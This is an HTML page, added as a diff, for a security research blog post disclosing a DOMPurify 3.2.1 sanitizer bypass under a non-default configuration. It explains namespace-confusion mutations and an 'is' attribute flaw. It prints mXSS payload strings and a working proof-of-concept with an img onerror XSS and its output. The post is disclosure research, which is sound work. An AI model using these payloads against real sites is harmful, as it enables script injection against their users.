@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    
+        
+            <meta name="twitter:card" content="summary_large_image">
+            <meta name="twitter:site" content="@YNizry">
+            <meta name="og:image" content="https://yaniv-git.github.io/img/blogs/dompurify/HeroImage.png">
+            <meta name="twitter:image" content="https://yaniv-git.github.io/img/blogs/dompurify/HeroImage.png">
+        
+        
+            <meta name="og:title" content="DOMPurify 3.2.1 Bypass (Non-Default Config)">
+            <meta name="twitter:title" content="DOMPurify 3.2.1 Bypass (Non-Default Config)">
+        
+        
+            <meta name="og:description" content="This blog post covers DOMPurify 3.2.1 Bypass, explaining a specific mutation technique">
+            <meta name="twitter:description" content="This blog post covers DOMPurify 3.2.1 Bypass, explaining a specific mutation technique">
+        
+    
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta property="og:type" content="website">
+    <meta name="description" content="Security research blog">
+    <meta name="keyword"  content="security,research,vulnerability,blog,vulnerabilites">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <title>
+        
+        DOMPurify 3.2.1 Bypass (Non-Default Config) - YNizry
+        
+    </title>
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/aircloud.css">
+
+    
+<link rel="stylesheet" href="/css/gitment.css">
+
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_28hi1hpxx24.css" rel="stylesheet" type="text/css">
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <style>
+    .googleicon {
+        vertical-align: middle;
+        font-size: 20px;
+        font-style: normal;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;    
+        color: #999999;
+        }
+    </style>
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+
+    
+  
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-SCK9223GY8"></script>
+    <script>
+      window.dataLayer = window.dataLayer || []
+      function gtag() {
+        dataLayer.push(arguments)
+      }
+      gtag('js', new Date())
+      gtag('config', 'G-SCK9223GY8')
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Yaniv Nizry Blogs" type="application/atom+xml">
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.webp" />
+        </div>
+        <div class="name">
+            <i>Yaniv Nizry</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="material-icons googleicon">home</i>
+                    <span>Blogs</span>
+                </a>
+            </li>
+            <li >
+                <a href="/advisories">
+                    <i class="material-icons googleicon">speaker_notes</i>
+                    <span>Advisories</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="material-icons googleicon">label</i>
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archive">
+                    <i class="material-icons googleicon">archive</i>
+                    <span>Archives</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="material-icons googleicon">person</i>
+                    <span>About</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="material-icons googleicon">search</i>
+                    <span>Search</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Background"><span class="toc-text">Background</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Namespace-Confusion-Regardless-of-a-Parental-Check"><span class="toc-text">Namespace Confusion, Regardless of a Parental Check</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-is-Attribute"><span class="toc-text">The is Attribute</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#The-Bypass"><span class="toc-text">The Bypass</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-text">Summary</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-bg" id="search-bg"></div>
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        <div class="post-container">
+    <div class="post-title">
+        DOMPurify 3.2.1 Bypass (Non-Default Config)    
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2024-12-08 23:00:00</span></span>
+        
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#xss" title="xss">xss</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#dompurify" title="dompurify">dompurify</a>
+        <span>/</span>
+        
+        <a class="tag" href="/tags/#mxss" title="mxss">mxss</a>
+        <span>/</span>
+        
+        </span>
+        
+        
+
+        
+
+
+        
+        <!--<span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>-->
+    </span>
+    </span>
+    </div>
+
+    <div class="post-source-meta post-meta">
+        
+    </div>
+    <div class="post-content no-indent">
+        <h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>Over the years, we have seen DOMPurify bypasses using various techniques. A prominent one is namespace confusion, which usually takes advantage of <a href="https://yaniv-git.github.io/2024/05/26/mXSS:%20The%20Vulnerability%20Hiding%20in%20Your%20Code/#Parsing-round-trip">parsing roundtrip tricks</a> to change the namespace of certain elements. Up until the <a target="_blank" rel="noopener" href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/">discovery</a> of Michał Bentkowski’s (<a target="_blank" rel="noopener" href="https://x.com/securitymb">@SecurityMB</a>) <code>form</code> element mutation in 2020 (Which resulted in version 2.0.17 bypass using confusion of a direct descendant in MathML’s HTML integration point), there wasn’t any significant mitigation mechanism to tackle namespace confusion. A solution proposed by Michał was to verify if the element is in the correct namespace by checking the parent namespace. This was later <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify/pull/495">implemented</a> and would go down as a bulletproof approach to prevent namespace confusion for years.</p>
+<p>Up until earlier this year (2024), <a target="_blank" rel="noopener" href="https://x.com/icesfont2">@IcesFont</a> discovered a new mXSS vector, this time exploiting the limitation of nested elements’ depth. This and <a target="_blank" rel="noopener" href="https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes">subsequent discoveries</a> on the topic led DOMPurify maintainers to implement various changes, such as disabling HTML integration in SVG namespace and adding additional regex validations, so that regardless of namespace confusions, there isn’t supposed to be a way to bypass the sanitizer.</p>
+<p>But today, we will cover a different mutation that can cause namespace confusion despite having the parental check and without using nesting limitation techniques (credit to <a target="_blank" rel="noopener" href="https://x.com/kinugawamasato">@kinugawamasato</a>, who discovered it independently and <a target="_blank" rel="noopener" href="https://x.com/kinugawamasato/status/1843687909431582830">covered</a> it briefly on Twitter).</p>
+<h1 id="Namespace-Confusion-Regardless-of-a-Parental-Check"><a href="#Namespace-Confusion-Regardless-of-a-Parental-Check" class="headerlink" title="Namespace Confusion, Regardless of a Parental Check"></a>Namespace Confusion, Regardless of a Parental Check</h1><p>This technique enables an element to jump an arbitrary amount of nested elements up using the following payload:</p>
+<p><code>&lt;root&gt;&lt;foo-bar&gt;&#123;arbitrary element(s)&#125;&lt;p&gt;&#123;arbitrary HTML element(s)&#125;&lt;table&gt;&lt;foo-bar&gt;&lt;p&gt;&lt;/p&gt;&lt;/foo-bar&gt;&lt;payload&gt;</code></p>
+<p>Parsing it will result in the following DOM tree:</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">├─ <span class="tag">&lt;<span class="name">foo-bar</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  ├─ </span><span class="template-variable">&#123;arbitrary element(s)&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">│  │  ├─ <span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  │  ├─ </span><span class="template-variable">&#123;arbitrary HTML element(s)&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">│  │  │  │  ├─ <span class="tag">&lt;<span class="name">foo-bar</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  │  │  │  ├─ <span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  │  │  ├─ <span class="tag">&lt;<span class="name">payload</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  │  │  ├─ <span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>And on the second parsing iteration, the DOM will look as such:</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">├─ <span class="tag">&lt;<span class="name">foo-bar</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  ├─ </span><span class="template-variable">&#123;arbitrary element(s)&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">│  │  ├─ <span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  │  ├─ </span><span class="template-variable">&#123;arbitrary HTML element(s)&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">│  │  │  │  ├─ <span class="tag">&lt;<span class="name">foo-bar</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">│  │  ├─ <span class="tag">&lt;<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">├─ <span class="tag">&lt;<span class="name">payload</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">├─ <span class="tag">&lt;<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>Generally speaking what comes after the <code>p</code> element (which can also be other ones such as <code>dd</code>, <code>dt</code>, <code>li</code>) will escape to the level next to the initial <code>foo-bar</code>.<br>However, for this to cause namespace confusion, the <code>foo-bar</code> element must be in both a foreign namespace and HTML. Since DOMPurify doesn’t allow HTML integration in SVG anymore, we cannot use this in the SVG namespace (which would have been convenient because SVG shares some elements, such as <code>a</code>, with HTML by default). </p>
+<p>Interestingly, if we allow custom elements in DOMPurify, it actually allows them in all namespaces:<br><img src="/img/blogs/dompurify/image1.png" style="width: 100%;"/></p>
+<p>So we can use this to have various types of namespace confusions (note that the SVG ones are applicable to older versions where HTML integration ponits were allowed):</p>
+<ul>
+<li>From HTML into SVG or MathML:<ul>
+<li><code>&lt;math&gt;&lt;foo-test&gt;&lt;mi&gt;&lt;li&gt;&lt;table&gt;&lt;foo-test&gt;&lt;li&gt;&lt;/li&gt;&lt;/foo-test&gt;a&lt;a&gt;</code></li>
+<li><code>&lt;svg&gt;&lt;a&gt;&lt;foreignObject&gt;&lt;p&gt;&lt;table&gt;&lt;a&gt;&lt;li&gt;&lt;/li&gt;&lt;/a&gt;&lt;a&gt;</code></li>
+</ul>
+</li>
+<li>From SVG to MathML:<ul>
+<li><code>&lt;math&gt;&lt;mi&gt;&lt;li&gt;&lt;table&gt;&lt;mi&gt;&lt;li&gt;t&lt;/mi&gt;&lt;/li&gt;&lt;/mi&gt;&lt;/math&gt;&lt;a&gt;&lt;svg&gt;</code></li>
+<li><code>&lt;math&gt;&lt;foo-test&gt;&lt;mi&gt;&lt;li&gt;&lt;table&gt;&lt;foo-test&gt;&lt;li&gt;&lt;/li&gt;&lt;/foo-test&gt;a&lt;svg&gt;&lt;title&gt;&lt;/title&gt;&lt;/svg&gt;</code></li>
+</ul>
+</li>
+<li>From MathML to SVG: <ul>
+<li><code>&lt;svg&gt;&lt;a&gt;&lt;foreignObject&gt;&lt;p&gt;&lt;table&gt;&lt;a&gt;&lt;li&gt;&lt;/li&gt;&lt;/a&gt;&lt;math&gt;</code></li>
+</ul>
+</li>
+<li>From SVG to HTML:<ul>
+<li><code> &lt;svg&gt;&lt;a&gt;&lt;foreignObject&gt;&lt;li&gt;&lt;table&gt;&lt;a&gt;&lt;li&gt;&lt;/table&gt;&lt;/li&gt;&lt;/a&gt;&lt;/a&gt;&lt;title&gt;&lt;svg&gt;&lt;a alt=&quot;&lt;/title&gt;&lt;img&gt;&quot;&gt;</code></li>
+</ul>
+</li>
+<li>From MathML to HTML:<ul>
+<li><code>&lt;math&gt;&lt;foo-test&gt;&lt;mi&gt;&lt;li&gt;&lt;table&gt;&lt;foo-test&gt;&lt;li&gt;&lt;/li&gt;&lt;/foo-test&gt;a&lt;/table&gt;&lt;/li&gt;&lt;/mi&gt;&lt;a&gt;</code></li>
+</ul>
+</li>
+</ul>
+<p>But as mentioned before, this is not enough to have a bypass. Some regex checks will delete <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L1333">attributes</a>, <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L1062-L1063">raw_data</a> elements, or <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L1079">comments</a> if the content is considered dangerous.</p>
+<h1 id="The-is-Attribute"><a href="#The-is-Attribute" class="headerlink" title="The is Attribute"></a>The <em><code>is</code></em> Attribute</h1><p>I was reading the <a target="_blank" rel="noopener" href="https://jorianwoltjer.com/blog/p/hacking/mutation-xss">official solution write-up</a> for a small mXSS challenge created by <a target="_blank" rel="noopener" href="https://twitter.com/J0R1AN">Jorian</a>, and they discussed an interesting topic, where the <a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/#attr-is"><code>is</code> attribute</a> cannot be <a target="_blank" rel="noopener" href="https://sonarsource.github.io/mxss-cheatsheet/#is">deleted</a>. Which got me wondering how DOMPurify handles such behavior. When looking at the code, the library was already aware of this and had <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify/blob/3.2.1/src/purify.ts#L845">implemented mitigation</a>. But there was a small mistake <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify/commit/79d57d6465c88101d512e06377b6e6babe8a11c2">introduced</a> in 2021. That caused the <code>forceRemove</code> function to be obsolete if the <code>is</code> attribute is in the <code>ALLOWED_ATTR</code> array, allowing arbitrary content in the <code>is</code> attribute if allowed in the configuration.</p>
+<h1 id="The-Bypass"><a href="#The-Bypass" class="headerlink" title="The Bypass"></a>The Bypass</h1><p>All that is left to do is to combine those two topics</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">DOMPurify.sanitize(</span></span><br><span class="line"><span class="language-xml">&#x27;<span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">foo-test</span>&gt;</span>a<span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span>a<span class="tag">&lt;<span class="name">foo-bar</span> <span class="attr">is</span>=<span class="string">&quot;--&gt;&lt;img</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">src=x onerror=alert(1)&gt;&quot;</span>&gt;</span>&#x27;,</span></span><br><span class="line"><span class="language-xml">    </span><span class="template-variable">&#123;</span></span><br><span class="line"><span class="template-variable">        ADD_ATTR: [&#x27;is&#x27;],</span></span><br><span class="line"><span class="template-variable">        CUSTOM_ELEMENT_HANDLING: &#123;</span></span><br><span class="line"><span class="template-variable">        tagNameCheck: /^foo-/,</span></span><br><span class="line"><span class="template-variable">    &#125;</span><span class="language-xml">,</span></span><br><span class="line"><span class="language-xml">&#125;);</span></span><br><span class="line"><span class="language-xml">&gt;&gt;&gt; <span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;<span class="name">mi</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;!--<span class="tag">&lt;/<span class="name">style</span>&gt;</span>a<span class="tag">&lt;<span class="name">foo-bar</span> <span class="attr">is</span>=<span class="string">&quot;--&gt;&lt;img src=x</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="language-xml">onerror=alert(1)&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">foo-bar</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span>a<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">mi</span>&gt;</span><span class="tag">&lt;/<span class="name">foo-test</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<img src="/img/blogs/dompurify/image2.png" style="width: 100%;"/>
+
+<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In this blog, we discussed the latest, config-dependent, DOMPurify bypass, from an interesting namespace confusion trick to the mishandling of the <code>is</code> attribute. I would like to give a special thanks to <a target="_blank" rel="noopener" href="https://x.com/cure53berlin">@cure53berlin</a> for their incredible responsiveness, addressing the report quickly, and generally keeping up the support for this project.</p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+        <div id="lv-container"></div>
+        <div class="giscus"></div>
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        <li>
+            <a target="_blank" href="https://twitter.com/YNizry">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-twitter"></i>
+                            </span>
+            </a>
+        </li>
+        
+        
+
+        
+
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://github.com/yaniv-git">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-github"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+        
+        <li>
+            <a target="_blank"  href="https://www.linkedin.com/in/yaniv-n-8b4a76193">
+                            <span class="fa-stack fa-lg">
+                                <i class="iconfont icon-linkedin"></i>
+                            </span>
+            </a>
+        </li>
+        
+
+    </ul>
+    
+    <p>
+    Theme <a target="_blank" rel="noopener" href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+
+<script src="/js/index.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+</html>
